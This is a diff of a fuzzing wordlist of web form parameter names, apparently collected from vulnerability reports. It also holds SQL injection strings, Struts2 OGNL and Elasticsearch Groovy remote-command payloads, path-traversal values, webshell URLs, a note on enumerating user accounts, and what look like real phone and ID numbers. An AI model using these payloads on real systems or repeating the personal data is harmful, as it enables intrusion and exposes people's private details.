-[1,[{"d":0,"tl":"??￥è?°1","mt":1420693290,"nn":0,"tg":"","sc":0,"checksum":"758d018393527ab0dcf1e185e21c4c60","favorite":0,"ct":1420693196,"au":"","v":3563,"encrypted":0,"r":0,"p":"/FBFBFA20CF98469F9BF19C1F53C1E772/8AC2996E50B642EA9788D57B844F3399","su":"","created_product":"YNote-PC","ng":"","del":0,"pp":{"nbtl":"é??èˉ??ˉ?????μ?èˉ?","dg":"??ˉ????????¨??·??????lisdfte??ˉ????ˉ???????te3st999332","thmurl":null,"WHOLE_FILE_TYPE":"OMAPFILE","ressize":"0","tp":"2","FILE_IDENTIFIER":"6B6A960617DC48DC8567DFB16D40A469","spaceused":"303","resnum":"1"},"et":0,"sz":3814,"er":0,"ps":0,"dr":0}]]
-carName
-Mileage
-zcd
-szd
-{"account":"13888888888' AND (SELECT 5906 FROM(SELECT COUNT(*),CONCAT(0x716b716a71,(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,54)),0x716a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'UBuc'
-{"account":"13888888888","password":"8abff0aa0877844584df31b9e4e45831","platform":1,"version":"3.9.2"}
-ibnLogin.y
-ibnLogin.x
-numid
-{"Hostname":"","Domainname":"","User":"","AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"ExposedPorts":{},"PublishService":"","Tty":true,"OpenStdin":true,"StdinOnce":true,"Env":[],"Cmd":["-h"],"Image":"registry.intra.weibo.com/weibo_blogarticle/tfs-nginx:20150625","Volumes":{},"VolumeDriver":"","WorkingDir":"","Entrypoint":["/bin/bash","-c"],"NetworkDisabled":false,"MacAddress":"","OnBuild":null,"Labels":{},"HostConfig":{"Binds":null,"ContainerIDFile":"","LxcConf":[],"Memory":0,"MemorySwap":0,"CpuShares":0,"CpuPeriod":0,"CpusetCpus":"","CpusetMems":"","CpuQuota":0,"BlkioWeight":0,"OomKillDisable":false,"MemorySwappiness":-1,"Privileged":false,"PortBindings":{},"Links":null,"PublishAllPorts":false,"Dns":null,"DnsSearch":null,"ExtraHosts":null,"VolumesFrom":null,"Devices":[],"NetworkMode":"","IpcMode":"","PidMode":"","UTSMode":"","CapAdd":null,"CapDrop":null,"GroupAdd":null,"RestartPolicy":{"Name":"no","MaximumRetryCount":0},"SecurityOpt":null,"ReadonlyRootfs":false,"Ulimits":null,"LogConfig":{"Type":"","Config":{}},"CgroupParent":"","ConsoleSize":[42,80]}}
 s_date_CRtext
 s_key
 s_author
@@ -19633,11 +19431,9 @@ addr_name
 cityselect
 dist_cd_addr
 prvselect
-2966AA9F9A149371483724B75DC53D50AD1EBCEB8D1C521B1478D58D6D2F4401A2C1E427857D9B23F95792E555157890669065F66341F4A09147C1DDB4A8AB6C26BA0BDAE094A298AD69D31A8563D934CF9169F0958250868F7E8643CF7EA858BF6860B75B669AE1F2869EB860D4658977A4DE3445C5C5D504F2471072C292BDBAA2A888F4DF7D1AFC44E84C44F788E0DB10D70741534BF4D2C228BCD560F4E3EFB0FDA085F2034BD875F6470FE379680FF8D379292FE5AC4ED255FE1EB4FAC4821C6F81FFB5DC363C13FEBFC5D008110C8B6A0BA95743642E03E009D1F6C21EEF4156F204A5F5ECBF4EE4C26A152DD68163CD484BE3989916D074774E1D10A10A6784B2BD31EF7C40E90E1FD63A5387C987F69F0FBB3F24DE4CB013F501E37E7B3BF34458D75E508FCFD1F4D179C05179F93A718DAE9104C9176472EACF1E448D436D86256AF9970C966231EB3FFA323CDEEB5C144613EE13A4ED2ADA7896CD05667F4CA39EBA9F3C0456757A6BAC5BAE8070A477F4871FA3F100499758A6E5C4CA7F6D0ACBB3392D6283528D5940965425CA093F53F136D8503F5790C8F79738351B6E9A80F3FFB9B9AA7B26A8370751CC95B47A4CEBA7EA111FE56852BDF57595DC9B20BD84ED3B3AF54926DF8DE175CD5AA8F6CD8BB7E41C900F7F839BB823F8106E32AFFF26
 re_url
 AirlineCode
 Page_Index
-r\.sqlmap\output\123.59.58.72'
 U_Address
 U_EMail
 U_PostCode
@@ -19662,7 +19458,6 @@ ItineraryType
 OrderStatusName
 product_num1
 scrollto
-_wp_http_referer
 _wpnonce
 newcontent
 [*] zzbtp
@@ -19692,11 +19487,9 @@ tsn[]
 discountmoney
 invpayee
 1442387826777
-{"email":"**<a href
 expertsIdnum
 expertsName
 expertsMobile
-{"usercode":"admin*","password":"admin","remember":false,"city":"?1???????????±±???"}
 policy
 mobile_Basic_Data
 basic_Data
@@ -19751,41 +19544,6 @@ goods[pmt_id]
 goods[goods_id]
 goods[product_id]
 goods[num]
-{"appid":1001,"clientver":7685,"mid":"{9A228215-41D9-43AD-9A0C-613E7BA51838}","key":"980dfa886df5d7e4145037b79ef30c05","clienttime":1460173869,"platform":"pc"}
-{"get_classify_list_info_cmd":{"userSession":"5E350D13-F093-4CD0-A5FE-9DCFBFCFF21D","mode_id":"B92441F0-B325-453C-9758-111D7AB69190","VHierarchyID":"ADMIN","classify_id":"-1","group_id":"ADMIN","key_words":"3","count_page":"20","current_page":"1","sort_type":"state","sort_order":"desc"}}
-pageTotal
-keywords1
-{"UserName":"aaa","Password":"aaa"}
-ctl00$ContentPlaceHolder1$TextBoxCorpShortName
-ctl00$ContentPlaceHolder1$ddlProvince
-ctl00$ContentPlaceHolder1$TextBoxRegFund
-ctl00$ContentPlaceHolder1$TextBoxTeleLicense
-ctl00$ContentPlaceHolder1$TextBoxCustCareFax
-ctl00$ContentPlaceHolder1$TextBoxResDesc
-ctl00$ContentPlaceHolder1$TextBoxPermitLicense
-ctl00$ContentPlaceHolder1$TextBoxAccBankName
-ctl00$ContentPlaceHolder1$TextBoxFaxPhone
-ctl00$ContentPlaceHolder1$TextBoxRegEmail
-ctl00$ContentPlaceHolder1$btnCheckSIChName
-ctl00$ContentPlaceHolder1$TextBoxBankAccount
-ctl00$ContentPlaceHolder1$TextBoxParentSICode
-ctl00$ContentPlaceHolder1$TextBoxContactPhone
-ctl00$ContentPlaceHolder1$TextBoxSIEnName
-ctl00$ContentPlaceHolder1$TextBoxSrvDesc
-ctl00$ContentPlaceHolder1$TextBoxCustCarePhone
-ctl00$ContentPlaceHolder1$TextBoxTechDesc
-ctl00$ContentPlaceHolder1$TextBoxKeyWordAdd
-ctl00$ContentPlaceHolder1$TextBoxRegMobile
-ctl00$ContentPlaceHolder1$TextBoxSIChName
-ctl00$ScriptManager1
-ctl00$ContentPlaceHolder1$TextBoxParentCompany
-ctl00$ContentPlaceHolder1$TextBoxZipCode
-ctl00$ContentPlaceHolder1$TextBoxAddress
-ctl00$ContentPlaceHolder1$ddlCity
-ctl00$ContentPlaceHolder1$ddlCountry
-ctl00$ContentPlaceHolder1$TextBoxLegalPerson
-ctl00$ContentPlaceHolder1$TextBoxTaxRegCode
-ctl00$ContentPlaceHolder1$TextBoxWebSite
 selType
 verificationcode
 article.title
@@ -19818,7 +19576,6 @@ expiretime
 MM_insert
 Huser
 Hpwd
-{"security":{"id":"","appversion":"2.4.5","session":"","devicemodel":"iPhone","appkey":"CFITC","sysversion":"8.4","udid":"1626E17B-A81B-4191-A102-FC1112F948AC"},"head":{"method":"forgetPossword","action":"CustomerAction","state":"new"},"info":{"LoginName":"","CUSTTel":"13888888888"}}
 txtadminname
 button4
 txtadminpass
@@ -19980,10 +19737,6 @@ _parameters[nStartPos]
 _paraNames
 _parameters[nRecords]
 _parameters[condiIndentList]
-{moblie:'手机号',code:'6位数验证码',codePic:'nrz4wv'}
-redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27cmd.exe /c netstat -ano%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
-redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27whoami%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
-redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27cmd.exe /c dir /a /od D:\\apache\\apache-tomcat-7.0.32-A\\webapps%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}
 txtZGH
 pwdbackType
 bmen
@@ -19993,7 +19746,6 @@ s15
 changeWorkGroupPwd
 postData
 changeSettingPwd
-{"pid":"11"}
 log_in.x
 log_in.y
 ctl00%24cphContect%24Sel
@@ -20022,17 +19774,12 @@ all_course
 tags[0]
 hide_phone
 input_activecode
-{"request":{"header":{"reqTime":"2013-11-30 21:47:40.146","accountID":"5eexxx9-b8c6-4xxf-8b87-3c38xxxx68a","version":"20110303090115","serviceName":"GetHotelOrderList","digitalSign":"1C296BFCxxxxxxxxxD9C8DCB24"},"body":{"refId":"5866741","page":"1","memberId":"1xxxxx9","orderType":"0","clientInfo":{"clientIp":"1.1.1.1","refId":"5866741","versionType":"iPhone","versionNumber":"5.3.0","deviceId":"DC4D7xx4-3xx0-40xB-AB83-D7E9xxxxA40C"},"pageSize":"10","deviceId":"DC4Dxx4-3Cxx0-4xEB-AB83-D7E9xxxxx40C"}}}
-{"request":{"header":{"reqTime":"2013-11-30 21:59:25.339","accountID":"5ee7b429-b8c6-400f-8b87-3c384c4ea68a","version":"20110303090115","serviceName":"GetHotelOrderDetail","digitalSign":"376CB32B5xxxxxEE4700225C"},"body":{"memberId":"1xxxxx00","refId":"5866741","orderSerialId":"hh5xxxxxxd703","clientInfo":{"clientIp":"1.1.1.1","refId":"5866741","versionType":"iPhone","versionNumber":"5.3.0","deviceId":"DC4xx4-3C50-40xB-ABx3-D7E9DxxxxA40C"},"deviceId":"DCxxx94-3C50-4xxB-ABx3-D7E9xxxxA40C"}}}
-{"provincePinYin":"hunan","cityID":"170","district":"1639"}
-{"provincePinYin":"hunan","cityID":"170","district":"976"}
 敏感信息省略
 NAME%C2%A7-1%C2%A9givenName
 PHONE%C2%A7MOBILE%C2%B60
 Cookie: ……
 user_mail_tel
 1418007611954
-{"Code":1,"Message":"/userbind/setsafequestion/?type
 idcardno
 <post-data><method type
 txtUSERID
@@ -20058,7 +19805,6 @@ ckUP_8
 ckUP_2
 ckUP_4
 ckUP_5
-{"AccountingNo":"KH112test  tests   tests","Flag":"","TelNo":"13888888888"}
 butLogin
 hfScreenY
 hfScreenX
@@ -20068,7 +19814,6 @@ part_code
 ss.y
 ss.x
 [*] bdm0360063_db
-http://www.dlwsxx.com/sm2005/
 newPassword1
 newPassword2
 txtV
@@ -20210,7 +19955,6 @@ txtGoodsName
 txtTime2
 ddlState
 txtTime1
-{"bbs":"sjbbs","userid":"itwgiv","productid":"0","boardid":"33855"}
 identcode
 参数：mobile
 ctl00%24ContentPlaceHolder1%24txtPsw
@@ -20231,15 +19975,10 @@ txt_PassWord
 txt_SerialNumber
 chatsource
 app_version_name
-{"logEntity":{"CusCode":"","SessionID":"ba1fae04-1b0f-46cd-b78e-60aa4cb58b46","Remark":"android-4.7.0","Action":"1","PlatFrom":"11","LogDate":"\/Date(1437584248877+0800)\/","IP":"10.20.7.122"},"newPwd":"a1234567","ordersource":"11","loginid":"13000000000"}
 usern
 passw
 true_memory
 ass_cardno
-A....cikGM..DMX..qr.,@`.`...pp.d..,...0f..19p..ec.2.8.$.
-Host: api.laiwang.com
-{header:{"code":0,"message":{"title":"","detail":""}},body:{dataStores:{},parameters:{"queryCode":"4"}}}
-{header:{"code":0,"message":{"title":"","detail":""}},body:{dataStores:{},parameters:{"letterId":"2015080701332"}}}
 EmailTitle
 EmailPassword
 SMTPPort
@@ -20255,8 +19994,6 @@ thblno
 ctl00%24ContentPlaceHolder1%24btn_Search
 ctl00%24ContentPlaceHolder1%24txt_CourseName
 ctl00%24ContentPlaceHolder1%24txt_TeacherName
-{"date":"2016-04-02","readList":[{"docId":5695001,"docTitle":"高像素之争 佳能EOS 5DSR对比索尼A7RⅡ","docType":0,"time":"2016-04-02 11:38:31' and sleep(3)
-{"date":"2016-04-02","readList":[{"docId":5695001,"docTitle":"高像素之争 佳能EOS 5DSR对比索尼A7RⅡ","docType":0,"time":"2016-04-02 11:38:31"}],"ssid":"dfd542b1b1c7d1c"}
 checkCodeLogin
 iata
 profitDictTypeId
@@ -20331,7 +20068,6 @@ ctl00%24ContentPlaceHolder1%24btnNext
 ctl00%24ContentPlaceHolder1%24txtUsername
 ctl00%24ContentPlaceHolder1%24txtCod
 ctl00%24ContentPlaceHolder1%24txtLsh
-{"SabreIDValue":"*"}
 dsBeginTm
 txtTutorName
 dsEndTm
@@ -20341,7 +20077,6 @@ loginErrCnt
 ddlCourseCategory
 ddlCollege
 encodedService
-ctl00%24httpurl
 ctl00_ContentPlaceHolder1_ATabUser_ClientState
 ctl00%24ContentPlaceHolder1%24ATabUser%24TabPanel1%24ctl01%24tbName
 ctl00%24ContentPlaceHolder1%24ATabUser%24TabPanel1%24ctl01%24tbUserId
@@ -20365,9 +20100,6 @@ account_role
 account_new_passwd_1
 account_name
 [08:32:29] [INFO] retrieved: ^C
-{"size":1,"script_fields": {"iswin": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"ifconfig\").getInputStream())).readLines()","lang": "groovy"}}}
-{"size":1,"script_fields": {"iswin": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/issue\").getInputStream())).readLines()","lang": "groovy"}}}
-{"size":1,"script_fields": {"iswin": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl scan.baidu.com\").getInputStream())).readLines()","lang": "groovy"}}}
 RYFL
 txtvalidCode
 txt_Content
@@ -20724,7 +20456,6 @@ Hcustcode_sp
 btn_test
 Texusername
 friendids
-{"params":{"javaClass":"org.loushang.next.data.ParameterSet","map":{"code":"410100000000'"},"length":1}}
 pass_again
 nostid
 paging1%24hdnPageIndex
@@ -20818,7 +20549,6 @@ user.sysUserPassword
 gcdw
 dcd
 用burpsuite设置userNo为变量，从13205320000遍历到13205329999导出用户信息，只看了姓名和余额，手机号，没具体分析其他字段的意义。
-{"deviceid":"A0000038518D0C","messages":{"args":{"plugin":3,"tag_id":0,"type":"1"},"modeltype":"chkAppVerV2"},"requesttype":"ver","sign":"8532ee52190bad39f3e308c8628d3c85","version":"39_1.6.4"}
 SearchForm[keyword]
 $db->query('INSERT INTO `ssomanage` (`mail_account`,`pwd`,`other_sys`,`i
 _rc
@@ -20829,7 +20559,6 @@ platCataID
 submitfrom
 dzxm
 workNum
-{"AuthInfo":{"passwd":"123456","user":"test"},"orderId":"381510-4"}
 noimg
 fr_t
 loginusername
@@ -20852,7 +20581,6 @@ event[summary]
 event[isallday]
 event[start]
 event[end]
-{"email_or_mobile":"§Wooyun§","password":"abc123"}
 AgencyTypes
 img_types
 keystring
@@ -20866,7 +20594,6 @@ addCount
 temStatus
 account.startTime
 account.endTime
-{"status":1,"msg":"<p>\n\t\t\t\t\t\u4eb2\u7231\u7684<span>xiaoqiang27good<\/span>\uff1a\n\t\t\t\t<\/p>\n\t\t\t\t<p style
 tb_LoginID
 tb_FrPerson
 tb_EptIntro
@@ -20923,9 +20650,6 @@ SEARCH_SELECT_TYPE
 HeadImage
 PhoneCode
 UPwd
-{"add_user_info_cmd":{"userSession":"FEBE1888-E8C3-4331-9806-85F16C18460D","mode_id":"DDDD9367-96F7-4790-909F-BA8E62D6D452","real_name":"","user_name":"111111","type":"0","tel":"","mobile":"","corp":"","notice":"","psw":"1a100d2c0dab19c4430e7d73762b3423","email":"","VHierarchyID":"ADMIN"}}
-{"set_user_info_cmd":{"userSession":"E5BCAE25-2475-4D6C-8202-819D1863915A","mode_id":"DDDD9367-96F7-4790-909F-BA8E62D6D452","real_name":"","user_name":"admin","type":"1","tel":"","mobile":"","corp":"","notice":"","psw":"e3ceb5881a0a1fdaad01296d7554868d","email":""}}
-{"del_user_info_cmd":{"userSession":"FEBE1888-E8C3-4331-9806-85F16C18460D","mode_id":"DDDD9367-96F7-4790-909F-BA8E62D6D452","user_name":"222222"}}
 print '\n[Done]user is', repr(user)
 ctl00%24ContentPlaceHolder1%24btnSearch
 ctl00%24ContentPlaceHolder1%24TextBox4
@@ -20941,7 +20665,6 @@ txtPartyName
 txtword
 dpdcity
 dpdemployement
-{"Event":"ReservationAct","Command":"Reservation","UserId":"aad9a6ad-f8bb-11e2-8fcc-90b11c58b16b","Phone":"1234567","CommentId":289,"Type":0,"Time":0,"PhoneList":[{"Name":"Leek","Phone":"15512345678"}],"QID":"HH:mm:ss.fff"}
 current database:    'hc_ucenter'
 year2
 zwkm
@@ -21019,8 +20742,6 @@ message_id[]
 delsubmit
 login_state
 Input2
-{"pCode":"46867588","username":"lisi","clientType":10}
-{"boardID":"9","count":20,"offset":0,"userID":"b14e1d1d-9dc3-4105-8b12-f02f0a94de91"}
 user_zwm
 user_bh
 user_lbm
@@ -21031,7 +20752,6 @@ user_nj
 txtuserpwd
 cmdfun
 idsno
-{"newsId":"20160122564629","operateType":"2","userName":"<a href
 X-forwarded-for: **.**.**.**
 FriendId
 expert.type
@@ -21164,7 +20884,6 @@ btnStu
 txtUserPass
 btnTea
 chkUser
-{"AirTransportQueryReq":{"cityName":"厦门","hotCity":"Y"}}
 educationCode
 mySubmit
 dkzt
@@ -21330,11 +21049,9 @@ save.y
 PersonWeb
 save.x
 [*] shutting down at 14:22:38
-{"area_equals":"","city_equals":"","title_equals":"","username_like":"*","phonenum_equals":"","enabled_equals":null}
 sear_isgold
 index_login_button.x
 index_login_button.y
-{"method":"secure.login.loginByUsername","type":"invoke.request","id":"cd4e93df-8575-43a2-8e8e-30a6610c8daa","params":{"logined":[],"password":"aaa","username":"aaa","captcha":""},"ncp":"1.0.0"}
 loginn
 pwdAgain
 TBX_UserName
@@ -21344,7 +21061,6 @@ linkOK.y
 txtInfo
 linkOK.x
 newkeyword
-{"method":"find_pwd","args":{"user_name":"<a href
 MobileChk
 isRemember
 data[email]
@@ -21375,7 +21091,6 @@ SFZH
 cmdsub
 XM
 ming
-参数{"shoppingCarID":"261700"}
 Fax
 UserPass2
 Mail
@@ -21532,10 +21247,6 @@ txtIdentity1
 txtPassword1
 memo_id
 sys_ver
-shell地址：http://**.**.**.**:8088/nlw/cms-data/temp_dir/xxxx/temp.files/xx.jsp
-shell地址：http://**.**.**.**/cms-data/temp_dir/xxxx/temp.files/xx.jsp
-shell地址：http://**.**.**.**/fsm/cms-data/temp_dir/xxxx/temp.files/xx.jsp
-shell：http://**.**.**.**/cms-data/temp_dir/xxxx/temp.files/xx.jsp
 unionid
 C1
 /**/0,1),1,1)%3D'z',sleep(3),0))/**/and/**/'1'%3D'1]
@@ -21590,7 +21301,6 @@ imgCode
 subjectTypeId
 ifWeibo
 ProtocolName
-{"cid":"","cv":"2.4.0","en":"3","reqBody":{"ccPasswd":"c/s7eGoaisuGcWIXrcE1oamS4fAZVuUqUzR2+FM9s0hxw51YB0v/J6uFIHH9ibmTNcepvIHdqOMnZFsJYb2bG1a2Iujxsx80eInYLTnfURVPy4z365O5Zy2PqHNj5A3GeWjqe1DD6P2VYdldf2lcMvsaLZk5Ur6XGfXgS6AI5Pw
 err_flag
 buttonClicked
 txtXMName
@@ -21625,8 +21335,6 @@ TextBoxPwd
 TextBoxStaff
 ROLETYPE
 [*] shutting down at 17:19:22
-{"BANKCODE":"3004","MOBILENO":"15910676783"}
-{"BANKCODE":"3004","CUSTNO":"30041000290461","NEWPWD":"cjfz9JrxT3MHmnuSMN1lpoYxB5vNxC+z7NY020i2fN2EIcLI4vYX40839p0t4kQCjapM/CcnXWoHMqSJ6614C6sS0BuVbqq0p6c+QLznriAdU9/aCP3a6WPx+dNv6QTgigOLWW4icMDztShwt94ZnKm/k4COE84oiPlSIOcl+bwsSgm0j/viKLRqy+DdWRPhCkntLi/j0iwReq83IPbU+Br41z+EtJP7/YvAipyLkr8
 fmimg
 dtfs
 secity
@@ -21649,7 +21357,6 @@ ADDRNAME
 saveFileName
 saveFilePath
 sort_field
-{"statics":{"os":"android4.3","udid":"C6B156109E96A281B93BF86D667F13CB","push_channelid":"4224745743595125467","simnumber":"","version":"3.1.4","token":"","device_token":"000000000000000","connecttype":"","push_userid":"916392260811243697","push_appid":"5336588","ua":"wooyun","user_id":"","imsi":"","channel":"main","mobile":"","system_version":"4.3"},"fun":{"reset_password":{"mobile":"13333333333"}},"version":"2"}
 CSRFToken_HW
 txtIdenty
 txtCkbmh
@@ -21703,7 +21410,6 @@ empName
 mnftr_id
 btnLandingSystem
 txtStaffCode
-{"request":{"header":{"reqTime":"2013-11-30 22:31:32.632","accountID":"5ee7b429-b8c6-400f-8b87-3c384c4ea68a","version":"20110303090115","serviceName":"GetContactList","digitalSign":"59BBAC4ssssssxxx8781B34"},"body":{"memberId":"15904190","refId":"5866741","clientInfo":{"clientIp":"1.1.1.1","refId":"5866741","versionType":"iPhone","versionNumber":"5.3.0","deviceId":"DC4D7994-3x50-40xB-ABx3-D7E9xxxxA40C"},"deviceId":"DC4xxx4-3C50-40xB-ABx3-D7E9D9xxxxx0C"}}}
 1433050683284
 dealId
 jsonapplist
@@ -21737,8 +21443,6 @@ _jtype
 tj_password
 skipHtml
 tj_username
-{"id": 7, "method": "BH.handle", "params": [[{"map": {"psMap": {"map": {"hql": "FROM dao.hb.CeUser AS user WHERE user.userid
-{"action":"login","arguments":["admin","888888","2290","","","",""],"params":{}}
 r_email
 r_title
 e_email
@@ -21766,10 +21470,8 @@ user_real_name
 14:01:13] [INFO] retrieved: 2010-07-10 00:00:00
 userpsw1
 btnConfirm
-{"header":{"device":"Genymotion,Google Nexus 4 - 4.1.1 - API 16 - 768x1280_2,vbox86p","macadd":"123456","platform":"generic,ANDROID,4.1.1"},"request":{"params":{"USER_ID":"110077"},"tokencode":"117386"}}
 f0b87b5
 POSTDATA: op
-{"bakname":"..\/..\/..\/newtest.txt","old_bakname":"..\/..\/..\/test.txt"}
 wt_nian
 wt_qi
 wt_zz
@@ -21785,7 +21487,6 @@ idTree
 modname
 TxtWorkNo
 TxtPass
-{"type":"1","password":"860b1d6552a8ed6d71c35b6de6ae0596","mobile":"151******9"}
 loginNameId
 loginPwdId
 _gridId
@@ -21826,10 +21527,8 @@ Button_Submit
 ctl00%24Content_Body%24Cp_Pass
 ctl00%24Content_Body%24Cp_User
 ctl00%24Content_Body%24Button1
-{"userName":"sj1873606****1","realName":"da","gender":"MALE"}
 Txtpwd
 Txtuser
-{"cpu":"","devicename":"ZHONGWEN","devicetype":"pc","imei":"","memory":""}
 tbCode
 ibtnLogin.y
 ibtnLogin.x
@@ -21845,8 +21544,6 @@ invoice_content
 zip_code
 invoice_head
 1407388061721
-{"mobile":"15208189281","type":1,"countryCode":"86","symbol":"CN"}
-{"mobile":"15208189768","symbol":"CN","countryCode":"86","code":"1234","password":"123456qq","passwordConfirm":"123456qq"}
 txtSearch
 isThumb
 sinceid
@@ -21875,7 +21572,6 @@ lgType
 print A(user
 print '破解失败'
 Host: report.dyjk.cn
-Referer: http://report.dyjk.cn/dangan.php
 FromName
 FromSno
 stu_num
@@ -21903,7 +21599,6 @@ hotelclass
 sortBy
 Remember
 sysadmin
-{"order":{"Domain":"科学计算、分子模拟、量子计算与气候气象业务","Type":"机时租用","Division":"GK-科学计算分区","Method":"包月","Amount":1,"Cpu":1,"Disk":1,"Vpn":1,"Softwares":"1","Other":"1","Company":"1111","Contact":"111","Mobile":"13555555555","Email":"<a href
 downstar
 [15:17:32] [INFO] retrieved:
 fbcomcLoginName
@@ -21915,8 +21610,6 @@ sign: 3a175d2b8a0ddb113c60fad427ffa8ac
 mb
 spacename
 qzreferrer
-{"credentialsType":"1","credentialsID":"aaaaaaaaaaaaa","companycode":"140222"}
-{"credentialsType":"1","credentialsID":"123123123123123123","companycode":"20131102"}
 print '\n[Done] User is:', user
 addHeight
 profilesubmit
@@ -21931,9 +21624,7 @@ info[0',0,(select (1) from mysql.user where 1%3d1 and (SELECT 1 FROM (select cou
 birthprovince
 tbUserPwd
 xdy_id
-http://medapp.ranknowcn.com/client/image.php?key
 and 1
-{"head":{"os":"ios","sessionId":"嗯嗯","sysid":"uip","password":"嗯嗯","osVersion":"8.8.8","userId":"","timestamp":"20880818188888","version":"2.6.6","functionid":"smsSend"},"parameter":{"content":"www.wooyun.org","mobile":"010－82990999","smsType":"1"}}
 txtValue
 Text_User
 Text_PWD
@@ -21977,7 +21668,6 @@ ismarried
 hdn_submit_sign
 sbdwmc
 HDDValidateCode
-{"platformName":"","productName":"106599"}
 Tablet_foundDate
 Tablet_Content
 Tablet_Relation
@@ -21985,7 +21675,6 @@ Tablet_Man
 select01
 swjgmc
 nsrmc
-{"retInf":"6396","safeBean":{"uuid":null,"inMno":null,"safeLevel":null,"bindTel":"18860900198","payPwd":null,"question":null,"question2":null,"answer":null,"answer2":null,"legPerCrdNo":null,"user":null,"retMsg":null,"usaPwd":null,"password":null}}
 occulevel
 nameStr
 buyNum
@@ -22058,8 +21747,6 @@ stupassword
 options[]
 p8
 p10
-{"BankId":"9999","LoginType":"P","IdNo":"110000198506144557","ConfirmLoginPassword":"W8eA591FHS4xcRu6pjoCRWtiz3rAFUzto2UhmL5J3Hk4PMOv2/+VJ0CSLBDeWg2DPP+s+bFoVjrel77AN+mH3T81HNu3de/LDMCoNDbBljyQhbt6+9oCCL6zfCrQbOpkg9m23Z1Sygyqv9n3xE8o2YdkuEzkWRGUoFABDJt/q8U
-{"LoginType":"P","_ChannelId":"PMBS","BankId":"9999"}
 Host: web.com
 _eventId
 Cookie: account
@@ -22127,7 +21814,6 @@ bi.lan
 ai.cp
 bi.cl
 [*] shutting down at 14:44:28
-{"userName":"admin","pwd":"admin","includeHide":false,"aqdKey":"*"}
 seachvalue
 Searchuser
 T_Message
@@ -22179,7 +21865,6 @@ Image2.y
 droXWLX
 txtxwzh
 IDcard
-{"Mobile":"15910773439","_RejCode":"000000","Email":"","modifyFlag":"6","PasswordConfirm":"4rlb34V+vFBNWocFA39rbQ
 gotoUrl
 1427426959721
 target_ids[0]
@@ -22190,16 +21875,12 @@ ctl00%24MainContent%24Password
 ctl00%24MainContent%24LoginButton
 ctl00%24MainContent%24UserName
 ddlSearchType
-{"body":{"nickName":"testtest","orderId":1730501,"userId":123946913},"clientInfo":{"deviceId":"990003157996618","refid":"35899326","versionNumber":"v4.3.0","versionType":"Android"},"header":{"accountID":"c26b007f-c89e-431a-b8cc-493becbdd8a2","digitalSign":"592e505e8830c16750d17cf3ad907cfcdb61135a","reqTime":"2015-10-13 23:29:03","version":"2014.6.13"}}
-{"recode":0,"error":"\u767b\u5f55\u6210\u529f"} //登录成功
-{"recode":1,"error":"\u767b\u5f55\u5931\u8d25"}
 PUBKEYINDEX
 NEWPASSWD
 VERIFYCODE
 pager.property
 pager.keyword
 PasswordAgain
-POST DATA：{"acctNbr":"15396213305","identityCd":"","identityNum":"","partyName":"","diffPlace":"local","areaId":"8350200","queryType":"","queryTypeValue":"","identidies_type":"接入号码 "}
 je_wp
 cxbz
 zjlsh
@@ -22272,7 +21953,6 @@ meetingNo
 get_password
 avatar_url
 +56
-upimg	http://p2.91huo.cn/t91/broadcast/c7/2d/91/c72d9149f543841f5ce0175f1f96cc1e.small.png"onload
 txtNPwd1
 txtNPwd
 top['id'](0)
@@ -22309,7 +21989,6 @@ input_mess
 simText-cardTypeId
 mfov
 mfo
-{ pno:'595000'}
 Payload: passWord
 queryProfession
 querYear
@@ -22334,7 +22013,6 @@ ctl00%24FeaturedContent%24DateReceived1
 select * from all_users
 select * from v$version
